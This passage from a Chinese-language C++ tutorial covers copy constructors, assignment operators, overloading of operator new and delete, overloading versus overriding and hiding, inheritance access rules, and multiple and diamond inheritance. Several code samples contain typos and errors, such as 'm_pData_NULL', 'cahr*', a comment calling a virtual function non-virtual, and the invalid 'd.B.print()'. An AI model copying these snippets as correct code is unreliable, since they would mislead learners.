class="line"></span><br><span class="line">String::<span class="built_in">String</span> (<span class="type">const</span> <span class="type">char</span> *pData) &#123; </span><br><span class="line">    <span class="keyword">if</span> (pData == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        m_pData=<span class="keyword">new</span> <span class="type">char</span>[<span class="number">1</span>] ;</span><br><span class="line">        *m_pData=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">int</span> length-<span class="built_in">strlen</span> (pData);</span><br><span class="line">        m pData=<span class="keyword">new</span> <span class="type">char</span> [length+<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">strcpy</span>(m_pData, pData) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 自定义构造函数</span></span><br><span class="line">CMyString::<span class="built_in">CMyString</span> (<span class="type">const</span> CMyString &amp;other)&#123;</span><br><span class="line">    <span class="type">int</span> iLen=<span class="built_in">strlen</span> (other .m pData) ;</span><br><span class="line">    m pData=<span class="keyword">new</span> <span class="type">char</span>[iLen+<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">strcpy</span> (m_pData, other.m_pData) ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 自定义拷贝构造函数</span></span><br><span class="line">CMyString::~<span class="built_in">CMyString</span>()&#123;</span><br><span class="line"><span class="keyword">delete</span> []m_pData;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 赋值运算符重载函数</span></span><br><span class="line">CMyString&amp; CMyString::<span class="keyword">operator</span>=(<span class="type">const</span> CMyString &amp;str)&#123;   <span class="comment">// 注意返回值类型为引用，形参为常量引用</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>== &amp;str)   <span class="comment">// 记得判断传入实例str和当前实例*this是否为同一实例</span></span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">delete</span> []m_ pData;   <span class="comment">// 记得释放实例自身已有的内存，否则可能引起内存泄露</span></span><br><span class="line">    m_pData_NULL;</span><br><span class="line">    m_pData=<span class="keyword">new</span> <span class="type">char</span>[<span class="built_in">strlen</span>(str.m_pData)+<span class="number">1</span>]; </span><br><span class="line">    <span class="built_in">strcpy</span>(m_pData, str.m_pData) ;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并不是出现“&#x3D;”就是调用赋值构造函数，<strong>赋值运算符重载的情况没有新对象产生，而拷贝构造函数是生成新的对象</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">string <span class="title">null_book1</span><span class="params">(<span class="string">&quot;9-999-99999-9&quot;</span>)</span></span>;    <span class="comment">//直接初始化</span></span><br><span class="line">string null_book2 = null_book1;        <span class="comment">//复制初始化</span></span><br><span class="line"><span class="function">string <span class="title">null_book2</span><span class="params">(null_book1)</span></span>;         <span class="comment">//复制初始化</span></span><br><span class="line">string null_book3 = <span class="string">&quot;9-999-99999-9&quot;</span>;   <span class="comment">//复制初始化，等号右侧相当于一个C风格字符串作为形参创建的string临时对象（产生新的对象）</span></span><br><span class="line">string null_book4;</span><br><span class="line">null_book4 = null_book3；<span class="comment">//不是调用复制构造函数，而是利用赋值运算符将null_book3赋值给null_book4，因为之前已经创建了空字符串对象null_book4（属于赋值运算符重载，没有产生新的对象）</span></span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;**<u>复制构造函数与赋值运算符的区别：</u>**是否有新对象产生&#x3D;&#x3D;</p><p>首先要说明的是，若用户没有定义, C++隐式声明一个拷贝构造函数和一个赋值运算符。</p><ul><li>拷贝构造函数<strong>涉及对象实例化</strong>，只在对象实例化时才会被调用，也就是说，在复制构造函数调用期间，这个对象处于一个未决状态(直到复制构造函数被成功调用)。而赋值运算符<strong>对现存对象</strong>进行赋值操作。</li><li>拷贝构造函数<strong>不返回任何值</strong>，void 都没有。而赋值运算符则在一个现存的对象被赋予新的值时被调用，并且它<strong>有返回值</strong>。</li></ul><h5 id="operator-new和operator-delete的重载"><a href="#operator-new和operator-delete的重载" class="headerlink" title="operator new和operator delete的重载"></a>operator new和operator delete的重载</h5><p><strong>new的执行过程是</strong>：首先，调用名为operator new的标准库函数，<u>分配足够大的原始未类型化的内存</u>，以保存指定类型的一个对象；接下来，<u>运行该类型的一个构造函数</u>，用指定初始化式构造对象；最后，<u>返回指向新分配并构造的对象的指针</u>。</p><p><strong>delete的执行过程是</strong>：首先，对sp指向的对象<u>运行适当的析构函数</u>；然后，通过调用名为operator delete的标准库函数<u>释放该对象所用内存</u>。</p><p>new和delete运算符的重载，实际上是对标准库函数operator new和operator delete的重载：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">X</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">X</span>() &#123;cout&lt;&lt;<span class="string">&quot;constructor&quot;</span>&lt;&lt;endl; &#125;</span><br><span class="line">    <span class="comment">// 重载操作符operate new，第一个参数为分配的空间大小（字节），类型为size_t，返回类型必须为void*</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span>* <span class="keyword">operator</span> <span class="title">new</span><span class="params">(size_ t size)</span> </span>&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;new&quot;</span>&lt;&lt;endl;</span><br><span class="line"><span class="keyword">return</span> ::<span class="keyword">operator</span> <span class="built_in">new</span>(size);    <span class="comment">// 只分配所要求的空间，不调用相关对象的构造函数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="keyword">operator</span> <span class="title">delete</span> <span class="params">(<span class="type">void</span>* pointee)</span> </span>&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;delete&quot;</span>&lt;&lt;endl ;</span><br><span class="line">::<span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(pointee)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">X</span>() &#123;cout&lt;&lt;<span class="string">&quot;destructor&quot;</span>&lt;&lt;endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span> <span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    X* px=<span class="keyword">new</span> <span class="built_in">X</span>();  <span class="comment">// 调用operator new分配空间，然后再调用构造函数</span></span><br><span class="line">    <span class="keyword">delete</span> px;      <span class="comment">// 先调用析构函数，再调用operator delete释放空间</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如何禁止产生堆对象：禁用new，也就是使operator new为private。同时为了对称，最好将operator delete也重载为private。</p><p>如何禁止产生栈对象：将构造函数或析构函数设为private。</p><h3 id="8-3-成员函数的重载、覆盖与隐藏"><a href="#8-3-成员函数的重载、覆盖与隐藏" class="headerlink" title="8.3 成员函数的重载、覆盖与隐藏"></a>8.3 成员函数的重载、覆盖与隐藏</h3><h4 id="成员函数的重载"><a href="#成员函数的重载" class="headerlink" title="成员函数的重载"></a>成员函数的重载</h4><p><strong>在同一类中</strong>定义的<strong>同名函数</strong>。重载函数的<strong>形参类型和数目有所不同</strong>。重载和成员函数<strong>是否为虚函数无关</strong>。</p><h4 id="成员函数的覆盖"><a href="#成员函数的覆盖" class="headerlink" title="成员函数的覆盖"></a>成员函数的覆盖</h4><p><strong>在派生类中</strong><u>覆盖</u>基类中的<strong>同名函数</strong>，<strong>要求基类函数必须是虚函数</strong>，且：</p><p>1）与基类的虚函数有<strong>相同的参数个数</strong></p><p>2）与基类的虚函数有<strong>相同的参数类型</strong></p><p>3）与基类的虚函数有<strong>相同的返回类型</strong>；或者都返回指针(或引用)，并且派生类虚函数所返回的指针(或引用)类型是基类中被替换的虚函数所返回的指针(或引用)类型的子类型(派生类型)。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">fun1</span><span class="params">(<span class="type">int</span> ,<span class="type">int</span>)</span></span>&#123;&#125;   <span class="comment">// 虚函数</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:<span class="keyword">public</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"> <span class="function"><span class="type">void</span> <span class="title">fun1</span><span class="params">(<span class="type">int</span> ,<span class="type">int</span>)</span></span>&#123;&#125;   <span class="comment">// 具有相同的函数名、参数个数、参数类型、返回类型，覆盖了A中的fun1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>覆盖的特征如下：</p><ul><li>不同的范围（分别位于派生类与基类）；</li><li>相同的函数名字；</li><li>相同的参数；</li><li>基类函数必须有vitural关键字。</li></ul><p>重载与覆盖的区别如下：</p><ul><li>覆盖是子类和父类之间的关系，是垂直关系；重载是同一个类中不同方法之间的关系，是水平关系。</li><li>覆盖要求参数列表相同，重载要求参数列表不同；覆盖要求返回类型相同，重载则不要求；</li><li>覆盖关系中，调用方法体是根据对象的类型来决定的，重载关系是根据调用时的实参表与形参表来选择方法体的。</li></ul><h4 id="成员函数的隐藏"><a href="#成员函数的隐藏" class="headerlink" title="成员函数的隐藏"></a>成员函数的隐藏</h4><p>隐藏指的是在某些情况下，<strong>派生类中的函数屏蔽了基类中的同名函数</strong>，这些情况包括:</p><ul><li><p>两个函数参数相同，但基类函数不是虚函数。和覆盖的区别在于基类函数是否是虚函数。</p><p>例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">(<span class="type">int</span> xp)</span></span>&#123;<span class="comment">//成员函数fun，非虚函数</span></span><br><span class="line">cout &lt;&lt; xp &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A&#123;    <span class="comment">//类B由类A派生而来</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">(<span class="type">int</span> xp)</span></span>&#123;&#125;<span class="comment">// 参数相同，但是基类函数不是虚函数，所以隐藏父类的fun函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">B b;</span><br><span class="line">b.<span class="built_in">fun</span>(<span class="number">2</span>);      <span class="comment">// 调用B中的函数fun</span></span><br><span class="line">b.A::<span class="built_in">fun</span>(<span class="number">2</span>);   <span class="comment">// 调用A中的函数fun</span></span><br></pre></td></tr></table></figure></li><li><p>两个函数参数不同，无论基类函数是否是虚函数，基类函数都会被屏蔽。和重载的区别在于两个函数不在同一类中。</p><p>例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">fun</span><span class="params">(<span class="type">int</span> xp)</span></span>&#123;<span class="comment">//非虚成员函数fun，参数为int型</span></span><br><span class="line">cout &lt;&lt; xp &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A&#123;    <span class="comment">//类B由类A派生而来</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">(cahr* xp)</span></span>&#123;&#125;<span class="comment">// 参数不同，隐藏父类的fun函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">B b;</span><br><span class="line">b.<span class="built_in">fun</span>(<span class="number">2</span>);     <span class="comment">// 错误，参数类型错误</span></span><br><span class="line">b.A::<span class="built_in">fun</span>(<span class="number">2</span>);  <span class="comment">// 通过，调用A中的函数fun</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="9-面向对象编程"><a href="#9-面向对象编程" class="headerlink" title="9. 面向对象编程"></a>9. 面向对象编程</h2><h3 id="9-1-继承"><a href="#9-1-继承" class="headerlink" title="9.1 继承"></a>9.1 继承</h3><p><strong>基类的构造函数(包括拷贝构造函数)、析构函数、赋值操作符重载函数，都不能被派生类继承。.</strong></p><p>一个派生类可以从一个或多个基类派生（单继承、多继承）。</p><p>多继承的定义格式如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> &lt;派生类&gt;:&lt;继承方式<span class="number">1</span>&gt; &lt;基类名<span class="number">1</span>&gt;,&lt;继承方式<span class="number">2</span>&gt; &lt;基类名<span class="number">2</span>&gt;, ...&#123;</span><br><span class="line">&lt;派生类新定义成员&gt;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>派生类对象由多个部分组成：派生类本身定义的(非static)成员加上由基类(非static)成员组成的子对象。</p><p>如果一个类有多个直接基类，而这些直接基类又有一个共同的基类，则在最低层的派生类中会保留这个间接的共同基类数据成员的多份同名成员。为了解决这个问题，提出了<strong>虚继承</strong>的概念。虚继承时，公共基类在对象模型中只有一份拷贝。</p><h4 id="基类成员在派生类中的访问属性"><a href="#基类成员在派生类中的访问属性" class="headerlink" title="基类成员在派生类中的访问属性"></a>基类成员在派生类中的访问属性</h4><p>派生类<strong>可以继承基类中除了构造函数与析构函数(赋值运算符重载函数也不能被继承)之外的成员</strong>，但是这些成员的访问属性在派生过程中是可以调整的。从基类继承来的成员在派生类中的访问属性是由继承方式控制的。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220629211927705.png" alt="image-20220629211927705"></p><ul><li><p>公有继承</p><p>父类的public成员成为子类的public成员，可以被该子类中的函数(内部访问)及其友元函数访问，除此之外，也可以<strong>由该子类的对象(属于外部访问)访问</strong>。</p><p>父类的private成员仍旧是父类的private成员，子类成员不可以访问这些成员，包括子类中的函数及其友元函数、子类对象。</p><p>父类的protected成员成为子类的protected成员，可以被该<strong>子类中的函数及其友元函数访问</strong>，除此之外，<strong>不可以由该子类的对象访问（不允许外部访问）</strong>。</p></li><li><p>私有继承</p><p>私有继承的特点是基类的公有成员和保护成员都作为派生类的私有成员，并且不能被这个派生类的子类所访问。在私有继承时，基类的成员只能由直接派生类访问，而无法再往下继承。</p></li><li><p>保护继承</p><p>保护继承的特点是基类的所有公有成员和保护成员都成为派生类的保护成员，并且<strong>只能被它的派生类成员函数或友元访问</strong>，基类的私有成员仍然是私有的。</p></li></ul><h4 id="继承时导致的二义性"><a href="#继承时导致的二义性" class="headerlink" title="继承时导致的二义性"></a>继承时导致的二义性</h4><h5 id="类间的转换"><a href="#类间的转换" class="headerlink" title="类间的转换"></a>类间的转换</h5><p>1） 在公有继承方式（私有、保护继承时，不能隐式转换）下，<strong>派生类的对象&#x2F;对象指针&#x2F;对象引用可以赋值给基类的对象&#x2F;对象指针&#x2F;对象引用（发生隐式转换）（上行转换）</strong>，基类的对象&#x2F;对象指针&#x2F;对象引用<strong>不能赋值</strong>给派生类的对象&#x2F;对象指针&#x2F;对象引用。<u>因为派生类包含了基类的所有信息，而基类缺乏派生类中的信息。</u>如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>: <span class="keyword">public</span> A&#123;&#125;；</span><br><span class="line">A a;</span><br><span class="line">B b;</span><br><span class="line"></span><br><span class="line">a=b;<span class="comment">//合法，派生类向基类隐式转换（向上转换）</span></span><br><span class="line">b=a;<span class="comment">//错误，基类向派生类转换，语句1</span></span><br><span class="line">A* pa=&amp;b;<span class="comment">//合法，隐式转换，派生类指针转换为基类指针</span></span><br><span class="line">B* pb=&amp;a;<span class="comment">//错误，语句2</span></span><br><span class="line">A&amp; ra=b;<span class="comment">//合法，隐式转换</span></span><br><span class="line">B&amp; rb=a;<span class="comment">//错误，语句3</span></span><br></pre></td></tr></table></figure><p>2）C++允许<strong>把基类对象指针&#x2F;引用<u>强制转换</u>（显式）成派生类的对象指针&#x2F;引用（下行转换）</strong>，如1）中代码，语句2可以改为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B* pb=(B*)&amp;a;</span><br></pre></td></tr></table></figure><p>语句3可以改为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">B&amp; rb=(B&amp;)a;</span><br></pre></td></tr></table></figure><p>但是语句1不能通过强制转换完成。</p><p>3）<strong>一个指向基类的指针可以用来指向该基类公有派生类的任何对象，这是C++实现程序运行时的多态性的关键。</strong></p><p>若存在<strong>多重继承</strong>，由于对象在往上转换期间（派生类转换为基类）出现多个类，因而<strong>对象会存在多个this指针</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">base1</span>&#123;</span><br><span class="line">    <span class="type">char</span> c[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">printthis1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;base1 this=&quot;</span>&lt;&lt;<span class="keyword">this</span>&lt;&lt;endl;  <span class="comment">// this为本类对象的地址</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">base2</span>&#123;</span><br><span class="line">    <span class="type">char</span> c[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">printthis2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;base2 this=&quot;</span>&lt;&lt;<span class="keyword">this</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">member1</span>&#123;</span><br><span class="line">    <span class="type">char</span> c[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">printthism1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;member1 this=&quot;</span>&lt;&lt;<span class="keyword">this</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">member2</span>&#123;</span><br><span class="line">    <span class="type">char</span> c[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">printthism2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;member2 this=&quot;</span>&lt;&lt;<span class="keyword">this</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">mi</span>:<span class="keyword">public</span> base1, <span class="keyword">public</span> base2&#123;</span><br><span class="line">    member1 m1;</span><br><span class="line">    member2 m2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">printthis</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;m1 this=&quot;</span>&lt;&lt;<span class="keyword">this</span>&lt;&lt;endl;</span><br><span class="line">        <span class="built_in">printthis1</span>();   <span class="comment">//调用继承自base1的printthis1函数</span></span><br><span class="line">        <span class="built_in">printthis2</span>();   <span class="comment">//调用继承自base2的printthis2函数</span></span><br><span class="line">        m1.<span class="built_in">printthism1</span>();</span><br><span class="line">        m2.<span class="built_in">printthism2</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    mi MI;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;sizeof(mi)=&quot;</span>&lt;&lt;<span class="built_in">sizeof</span>(mi)&lt;&lt;endl;</span><br><span class="line">    MI.<span class="built_in">printthis</span>();</span><br><span class="line">    base1* b1=&amp;MI;  <span class="comment">// 派生对象的指针赋值给基类指针（发生隐式转换）</span></span><br><span class="line">    base2* b2=&amp;MI;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;base 1 pointer=&quot;</span>&lt;&lt;b1&lt;&lt;endl;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;base 2 pointer=&quot;</span>&lt;&lt;b2&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sizeof(mi)=64</span><br><span class="line">m1 this=0031FCB0</span><br><span class="line">base1 this=0031FCB0</span><br><span class="line">base2 this=0031FCC0</span><br><span class="line">member1 this=0031FCD0</span><br><span class="line">member2 this=0031FCE0</span><br><span class="line">base 1 pointer=0031FCB0</span><br><span class="line">base 2 pointer=0031FCC0</span><br></pre></td></tr></table></figure><p>每一个类都有打印一个this指针函数，这些类通过多重继承和组合被装配成类mi，它打印自己和其他所有子对象的地址，有主程序调用这些打印功能。可以清楚地看到，<strong>能在一个相同的对象中获得两个不同的this指针</strong>。<br>  派生对象MI的起始地址和它的基类列表中的第一个类（base1）的地址是一致的，第二个类base2的地址随后，接着根据声明的次序安排成员对象(member1、member2的地址)。当向base1和base2进行上行转换时（语句<code>base1* b1=&amp;MI;</code>和语句<code>base2* b2=&amp;MI;</code>），产生的指针<strong>表面上是指向同一个对象MI，而实际上有不同的this指针，b1指向base1类的子对象，b2指向base2类的子对象。</strong></p><p>派生对象MI的地址空间：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220630111042948.png" alt="image-20220630111042948"></p><p>在上述代码中加入如下语句：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mi *b3= &amp;MI;</span><br><span class="line"><span class="keyword">if</span>(b1 == b3) cout&lt;&lt;<span class="string">&quot;b1==b3&quot;</span>&lt;&lt;endl ;</span><br><span class="line"><span class="keyword">if</span>(b2 == b3) cout&lt;&lt;<span class="string">&quot;b2==b3&quot;</span>;</span><br></pre></td></tr></table></figure><p>实际上，b1 与b3的比较过程中，由于两者类型不同，会发生隐式类型转换，b3 (mi*类型）会被隐式转换为basel* (派生类被隐式转换为基类，这是b1能与b3比较的基础，反过来转换不成立)，然后与b1进行比较；同理，b2与b3的比较过程中，b3会被转换为base2*，然后与b2进行比较，故实际输出为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b1==b3</span><br><span class="line">b2==b3</span><br></pre></td></tr></table></figure><h5 id="多基继承"><a href="#多基继承" class="headerlink" title="多基继承"></a>多基继承</h5><p>一般来说， 在派生类中对基类成员的访问应当具有唯一性， 但在多基继承时，如果多个基类中存在同名成员的情况，造成编译器无从判断具体要访问哪个基类中的成员，则称为对基类成员访问的：二义性问题。</p><p>若两个基类中具有同名的数据成员或成员函数，应<strong>使用成员名限定来消除二义性</strong>。比如<code>A::print()</code>。或者实现对基类同名成员函数的隐藏（见8.3节）。</p><h5 id="菱形继承"><a href="#菱形继承" class="headerlink" title="菱形继承"></a>菱形继承</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;  <span class="comment">//公共基类</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;this is x inA:”&lt;&lt; endl;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">class B: public A&#123;&#125;;  //类B由类A派生而来</span></span><br><span class="line"><span class="string">class C: public A&#123;&#125;;  //类C由类A派生而来</span></span><br><span class="line"><span class="string">class D : public B, public C&#123;&#125;; //类 D由类B和类C派生而来</span></span><br><span class="line"><span class="string">void main() &#123;</span></span><br><span class="line"><span class="string">D d;              //声明一个D类对象d，其含有2个基类对象A，一个基类对象B，一个基类对象C</span></span><br><span class="line"><span class="string">A* pa=(A*) &amp;d;    //上行转换产生二义性，语句1</span></span><br><span class="line"><span class="string">d.print();        //print()具有二义性，系统不知道是调用B类的还是C类的print()函数，语句2</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>上述代码的语句2<code>d.print();</code>编译错误，可改为以下的其中一种：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d.B.<span class="built_in">print</span>();</span><br><span class="line">d.C.<span class="built_in">print</span>();</span><br></pre></td></tr></table></figure><p>但是不能改为<code>d.A.print();</code>，因为d对象中有2个A类对象，故编译会报“基类A不明确”。</p><p>而语句2<code>A* pa=(A*) &amp;d;</code>产生的二义性也是因为d对象中有2个A类对象，转换时不知道让pa指向哪个子对象，可以改为以下的一种：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A* pa=(A*) (B*)&amp;d;</span><br><span class="line">A* pa=(A*) (C*)&amp;d;</span><br></pre></td></tr></table></figure><p><u>事实上，<strong>使用关键字virtual将共同基类A声明为虚基类</strong>，可有效解决上述二义性的问题。</u></p><h4 id="转换构造函数"><a href="#转换构造函数" class="headerlink" 